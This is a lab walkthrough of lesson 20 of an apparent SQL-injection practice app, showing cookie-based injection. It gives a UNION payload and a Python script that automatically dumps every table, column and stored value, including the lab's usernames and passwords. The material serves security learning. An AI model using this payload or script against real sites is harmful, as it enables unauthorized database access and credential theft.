# Lesson-20

POST parameter cookie injection

When we login using known username and password It will show:

```ABAP
YOUR USER AGENT IS : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
YOUR IP ADDRESS IS : 172.17.0.1
DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE
YOUR COOKIE : uname = Dumb and expires: Wed 12 May 2021 - 12:39:14
Your Login name:Dumb
Your Password:Dumb
Your ID:1
```

It tells us about a cookie uname with value `dumb` which is the username we gave to login

Putting the value of cookie as `\` gave us an error

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''\' LIMIT 0,1' at line 1
```

When we change the cookie to admin The values showed are changed

```ABAP
YOUR USER AGENT IS : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
YOUR IP ADDRESS IS : 172.17.0.1
DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE
YOUR COOKIE : uname = admin and expires: Wed 12 May 2021 - 12:42:47
Your Login name:admin
Your Password:admin
Your ID:8
```

So we have to use `'` to break the query and we can use union based injections to dump the database.

payload :

```ABAP
' union select 5,(select group_concat(table_name) from information_schema.tables where table_schema= database()),3#
```

So I created a script to do the work

```python
import requests

get_table = "(select group_concat(table_name) from information_schema.tables where table_schema= database())"
get_column = "(select group_concat(column_name) from information_schema.columns where table_name = '{0}')"
get_secret = "(select group_concat({0}) from {1})"
url = "http://localhost:1234/Less-20/"
session = requests.Session()

payload = "' union select 5,{},3#"

cookies = {"uname": payload.format(get_table)}
response = requests.post(url,cookies=cookies)
while('Subquery returns more than 1 row' in response.text):
    response = requests.post(url,cookies=cookies)
temp = response.text[839+len(payload.format(get_table)):-233]
tables = temp.split(',')
for i in tables:
    print("From Table", i, ": ")
    find = get_column.format(i)
    cookies = {"uname": payload.format(find)}
    response = requests.post(url, cookies=cookies)
    while('Subquery returns more than 1 row' in response.text):
        response = requests.post(url, cookies=cookies)
    temp = response.text[839+len(payload.format(find)):-233]
    columns=temp.split(',')
    print("Columns : ",*columns)
    for j in columns:
        print("From Column ", j, " - ",end='')
        find = get_secret.format(j,i)
        cookies = {"uname": payload.format(find)}
        response = requests.post(url, cookies=cookies)
        while('Subquery returns more than 1 row' in response.text):
            response = requests.post(url, cookies=cookies)
        print(response.text[839+len(payload.format(find)):-233])
```

It gave me:

```ABAP
From Table emails : 
Columns :  id email_id
From Column  id  - 1,2,3,4,5,6,7,8
From Column  email_id  - Dumb@dhakkan.com,Angel@iloveu.com,Dummy@dhakkan.local,secure@dhakkan.local,stupid@dhakkan.local,superman@dhakkan.local,batman@dhakkan.local,admin@dhakkan.com
From Table referers : 
Columns :  id referer ip_address
From Column  id  - 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52
From Column  referer  - ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
From Column  ip_address  - 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
From Table uagents : 
Columns :  id uagent ip_address username
From Column  id  - 
From Column  uagent  - 
From Column  ip_address  - 
From Column  username  - 
From Table users : 
Columns :  id username password
From Column  id  - 1,2,3,4,5,6,7,8,9,10,11,12,14
From Column  username  - Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
From Column  password  - Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
```
